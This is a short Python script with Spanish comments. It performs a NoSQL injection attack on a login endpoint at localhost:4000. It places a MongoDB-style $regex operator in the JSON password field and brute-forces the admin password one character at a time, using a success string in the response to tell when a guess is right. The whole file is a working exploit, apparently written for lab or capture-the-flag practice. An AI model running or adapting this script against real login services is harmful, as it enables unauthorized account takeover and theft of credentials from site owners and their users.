from pwn import *   # la barra de carga
import requests      # para las peticiones http
import time         # para jugar con los tiempos
import sys          # para las llamadas al sistema
import signal       # para la señal del ctrl_c
import string       # para jugar con los strings




def def_handler(sig, frame):
    print("\n\n(!) Saliendo...\n")
    sys.exit(1)

# ctrl_c
signal.signal(signal.SIGINT, def_handler)


def brute_nosqli():

    # creamos las barras de progreso
    progress1= log.progress("Fuerza Bruta")
    progress1.status("Iniciando BF")

    time.sleep(2)
    
    progress2 = log.progress("Password")

    # definimos la password variable vacia primeramente
    password=''  

    # iteracion de las posiciones de la longitud de la password
    for pos in range(1,24):

        # iteracion de todos los caracteres a probar por cada posicion
        for caracter in caracteres:
            
            data_post= '{"username":"admin","password":{"$regex":"^' + password + caracter + '"}}'

            progress1.status("probando con "+data_post)

            cabecera= {'Content-Type': 'application/json'}

            solicitud= requests.post(login_url, headers=cabecera, data=data_post)

            if "Logged in as user" in solicitud.text:
                password+=caracter
                progress2.status(password)
                break

# la url donde necesitare hacer la fuerza bruta 
login_url = "http://localhost:4000/user/login"


# como vamos a ir de la a-z y valores numericos
caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits



if __name__ == '__main__':
    brute_nosqli()
